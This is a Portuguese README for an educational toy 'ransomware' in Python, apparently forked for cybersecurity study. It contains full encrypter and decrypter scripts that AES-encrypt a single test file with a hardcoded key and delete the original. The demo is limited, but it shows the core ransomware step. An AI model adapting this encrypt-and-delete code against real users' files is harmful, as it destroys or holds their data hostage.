# Ransomware em Python:
Este projeto é uma ransomware desenvolvida em Python no Kali Linux. Ele criptografa e descriptografa arquivos por meio da biblioteca pyaes.

### Origem do Projeto:
Este projeto foi um fork de um repositório do GitHub. Ele foi estudado para fins educacionais sobre Cibersegurança.

### Como funciona:
O script encrypter.py criptografa um arquivo chamado teste.txt e cria um novo arquivo criptografado com a extensão .ransomwaretroll.
O script decrypter.py descriptografa o arquivo e restaura o seu conteúdo original.

- Criar um arquivo para teste:
Antes de rodar o script, crie um arquivo de teste:
echo "Alo Brasil" > teste.txt

- Executar o Encrypter:
python encrypter.py
isso removerá o arquivo teste.txt e criará teste.txt.ransomwaretroll.

- Executar o Decrypter:
python decrypter.py
isso removerá o arquivo criptografado e restaurará teste.txt.

### Códigos
Encrypter (encrypter.py)

import os
import pyaes

### Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

### Remover o arquivo original
os.remove(file_name)

### Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

### Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

### Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

Decrypter (decrypter.py)
import os
import pyaes

### Abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

### Chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

### Remover o arquivo criptografado
os.remove(file_name)

### Criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
